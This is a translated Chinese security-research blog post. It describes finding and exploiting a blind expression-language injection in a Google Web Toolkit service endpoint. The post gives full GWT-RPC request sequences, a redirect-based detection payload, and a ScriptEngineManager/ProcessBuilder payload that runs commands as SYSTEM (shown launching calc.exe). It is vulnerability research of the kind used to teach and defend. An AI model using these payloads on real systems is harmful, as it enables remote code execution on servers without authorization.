> 原文链接: https://www.anquanke.com//post/id/86169 


# 【技术分享】从序列化到shell——利用EL注入攻击Google Web Toolkit


                                阅读量   
                                **105117**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：srcincite.io
                                <br>原文地址：[http://srcincite.io/blog/2017/05/22/from-serialized-to-shell-auditing-google-web-toolkit-with-el-injection.html](http://srcincite.io/blog/2017/05/22/from-serialized-to-shell-auditing-google-web-toolkit-with-el-injection.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t013d2d94e7c0f0fcd0.png)](https://p4.ssl.qhimg.com/t013d2d94e7c0f0fcd0.png)



翻译：[shan66](http://bobao.360.cn/member/contribute?uid=2522399780)

预估稿费：150RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

此前，我曾经发表过一篇[**Google Web Toolkit（GWT）安全审计方面的文章**](http://srcincite.io/blog/2017/04/27/from-serialized-to-shell-auditing-google-web-toolkit.html)；今天，我们将重点关注在GWT端点中发现的一个特定的漏洞。值得庆幸的是，Matthias Kaiser已经帮助我们开发了相应的漏洞利用代码。

<br>

**简介**

本文将为读者详细介绍在Google Web Toolkit（GWT）端点中触发的一个“半复杂的”表达式语言注入漏洞。

<br>

**漏洞详解**

在WEB-INF / web.xml文件中，我发现了如下所示的映射关系 :



```
&lt;servlet&gt;
    &lt;servlet-name&gt;someService&lt;/servlet-name&gt;
    &lt;servlet-class&gt;com.aaa.bbb.ccc.ddd.server.SomeServiceImpl&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
    &lt;servlet-name&gt;someService&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/someService.gwtsvc&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;
```

我们可以看到，上面的代码引用了服务器映射。 由于GWT是通过定义客户端类来指出客户端访问哪些方法的，所以，我们不妨先考察一下相应的客户端类com.aaa.bbb.ccc.ddd.client.SomeService： 



```
public abstract interface SomeService
  extends RemoteService
`{`
  public abstract void sendBeanName(String paramString);
  public abstract Boolean setMibNodesInfo(List&lt;MIBNodeModel&gt; paramList);
  public abstract void createMibNodeGettingBean();
`}`
```

其中，有三个函数引起了我们的注意，下面，让它们看看它们分别都是干什么的。我们可以在包含类SomeServiceImpl的主jar存档中读取相应的Java代码，具体如下所示： 



```
public void sendBeanName(String paramString)
  `{`
    if (paramString == null) `{`
      return;
    `}`
    HttpSession localHttpSession = super.getThreadLocalRequest().getSession();
    if (localHttpSession != null) `{`
      localHttpSession.setAttribute("MibWidgetBeanName", paramString);
    `}`
  `}`
```

很好，这里可以使用一个处于我们控制之下的字符串来设置一个名为MibWidgetBeanName的会话属性。到目前为止，还没找到什么有趣的东西。下面，我们来考察setMibNodesInfo函数： 



```
public Boolean setMibNodesInfo(List&lt;MIBNodeModel&gt; paramList)
  `{`
    List localList = ModelUtil.mibNodeModelList2MibNodeList(paramList);
    if (localList != null)
    `{`
      MibNodesSelect localMibNodesSelect = getBeanByName();
```

这个函数用到一个List类型的输入参数，其中元素类型为MIBNodeModel类型。同时，mibNodeModelList2MibNodeList函数将对我们提供的列表的有效性进行检查，并根据列表的第一个元素的值来返回不同的字符串。

如果我们的列表中没有提供相应的值，它将定义一个List，并返回一个默认的MIBNodeModel实例。 然后，getBeanByName函数将被调用。那么，下面我们开始研究getBeanByName函数。 



```
private MibNodesSelect getBeanByName()
  `{`
    ...
    Object localObject1 = super.getThreadLocalRequest().getSession();
    if (localObject1 != null)
    `{`
      localObject2 = (String)((HttpSession)localObject1).getAttribute("MibWidgetBeanName");
      if (localObject2 != null)
      `{`
        localObject3 = null;
        try
        `{`
          localObject3 = (MibNodesSelect)FacesUtils.getValueExpressionObject(localFacesContext, "#`{`" + (String)localObject2 + "`}`");
        `}`
        finally
        `{`
          if ((localFacesContext != null) &amp;&amp; (i != 0)) `{`
            localFacesContext.release();
          `}`
        `}`
        return (MibNodesSelect)localObject3;
      `}`
    `}`
    return null;
  `}`
```

由于这是一种私有的方法，所以它不能通过客户端界面来访问，也就是说，我们不能直接调用它。 不过，从第8行看到，我们再次用到了属性MibWidgetBeanName，并将其存储到一个名为localObject2的字符串中。

这里的localObject2变量稍后会在第14行中用于检索表达式。这是一个经典的表达式注入漏洞，尤其是在反编译代码之后，大家会看的更清楚一些。

<br>

**漏洞利用代码**

首先，读者会注意到，这不是一种反射型的表达式语言注入漏洞。也就是说，我们无法通过查看代码执行的结果来验证漏洞。 因此，我将其归类为盲表达式语言注入漏洞。

假设我们在Java Servlet Faces（JSF）应用程序中有一个漏洞： 

```
&lt;h:outputText value="$`{`beanEL.ELAsString(request.getParameter('expression'))`}`" /&gt;
```

攻击者只需发出以下请求： 

```
http://[target]/some_endpoint/vuln.jsf?expression=9%3b1
```

由于浏览器会将+转换为空格，所以我们需要对+进行编码，从而确保实际发送的是9 + 1，而在服务器响应中，如果我们看到的值为10，就能确定这里有一个表达式语言注入漏洞，因为执行了相应的数学操作，即相加。实际上，这就是Burp Suite用于检测模板注入漏洞的方法。

然而，对于上面给出的易受攻击的代码而言，能否轻松确定出表达式语言注入漏洞呢？ 在尝试JSF api之后，我发现了一些非常简洁的函数，可以用来确定EL注入漏洞的存在，并且不会发出“outgoing”的HTTP请求。

根据相关的文档说明的介绍，我们可以在FacesContext实例上使用getExternalContext方法。这个方法会返回一个ExternalContext类型，允许我们设置特定的响应对象属性。在考察这个函数的过程中，我想起来两个函数： 



```
setResponseCharacterEncoding
    redirect
```

因此，我们可以将字符串设置为以下Java代码： 

```
facesContext.getExternalContext().redirect("http://srcincite.io/");
```

…如果响应是到http://srcincite.io/的302重定向，那么我们就可以确认，这个代码含有相应的漏洞。

<br>

**漏洞测试**

我们需要发出第一个请求是设置会话属性MibWidgetBeanName 



```
POST /someService.gwtsvc HTTP/1.1
Host: [target]
Accept: */*
X-GWT-Module-Base: 
X-GWT-Permutation: 
Cookie: JSESSIONID=[cookie]
Content-Type: text/x-gwt-rpc; charset=UTF-8
Content-Length: 195
6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|sendBeanName|java.lang.String|facesContext.getExternalContext().redirect("http://srcincite.io/")|1|2|3|4|1|5|6|
```

服务器响应为// OK [[]，0,6]，我们就可以知道GWT注入是成功的。然后，通过第二个请求触发存储在会话字符串中的表达式语言注入漏洞。但是，在发送这个请求之前，由于我们需要使用复合类型的setMibNodesInfo函数，因此我们需要查找定义允许发送的可用类型的策略文件。在[strong name] .gwt.rpc文件中，我找到了ArrayList的类型值：java.util.ArrayList / 382197682。

现在我们可以在请求中使用该类型了： 



```
POST /someService.gwtsvc HTTP/1.1
Host: [target]
Accept: */*
X-GWT-Module-Base: 
X-GWT-Permutation: 
Cookie: JSESSIONID=FB531EBCCE6231E7F0F9605C7661F036
Content-Type: text/x-gwt-rpc; charset=UTF-8
Content-Length: 171
6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|setMibNodesInfo|java.util.List|java.util.ArrayList/3821976829|1|2|3|4|1|5|6|0|
```

相应的响应如下所示： 



```
HTTP/1.1 302 Found
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=[cookie]; Path=/; Secure; HttpOnly
Set-Cookie: oam.Flash.RENDERMAP.TOKEN=-g9lc30a8l; Path=/; Secure
Pragma: no-cache
Cache-Control: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Pragma: no-cache
Location: http://srcincite.io/
Content-Type: text/html;charset=UTF-8
Content-Length: 45
Date: Wed, 03 May 2017 18:58:36 GMT
Connection: close
//OK[0,1,["java.lang.Boolean/476441737"],0,6]
```

当然，对所有的漏洞检测来说，重定向是非常不错的，但我们真正想要的却是shell。阅读Minded Securities的文章后，发现可以使用ScriptEngineManager的JavaScript引擎动态执行Java代码。当然，他们的代码有点长，这里给出我自己的精简版本。 

```
"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("var proc=new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"cmd.exe\",\"/c\",\"calc.exe\"]).start();")
```

使用该代码更新MibWidgetBeanName会话属性，并重新触发setMibNodesInfo函数，以SYSTEM身份执行命令： 



```
POST /someService.gwtsvc HTTP/1.1
Host: [target]
Accept: */*
X-GWT-Module-Base: 
X-GWT-Permutation: 
Cookie: JSESSIONID=[cookie]
Content-Type: text/x-gwt-rpc; charset=UTF-8
Content-Length: 366
6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|sendBeanName|java.lang.String|"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("var proc=new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"cmd.exe\",\"/c\",\"calc.exe\"]).start();")|1|2|3|4|1|5|6|
```

触发表达式语言注入漏洞… 



```
POST /someService.gwtsvc HTTP/1.1
Host: [target]
Accept: */*
X-GWT-Module-Base: 
X-GWT-Permutation: 
Cookie: JSESSIONID=FB531EBCCE6231E7F0F9605C7661F036
Content-Type: text/x-gwt-rpc; charset=UTF-8
Content-Length: 171
6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|setMibNodesInfo|java.util.List|java.util.ArrayList/3821976829|1|2|3|4|1|5|6|0|
```

[![](https://p1.ssl.qhimg.com/t012ddf842e2dbf386a.png)](https://p1.ssl.qhimg.com/t012ddf842e2dbf386a.png)

<br>

**小结**

从黑盒测试的角度来看，几乎没有办法可以发现这个漏洞。常见的工具，如Burp Suite，目前还无法检测到这种漏洞，特别是考虑到字符串存储在会话属性中的特殊情况。

随着网络技术的进步，我们对自动化的需求正在日益增加，但是在这方面的工具、技能和知识还相对缺乏，因此，许多相关的应用程序的关键代码执行漏洞还会存在一段时间。 
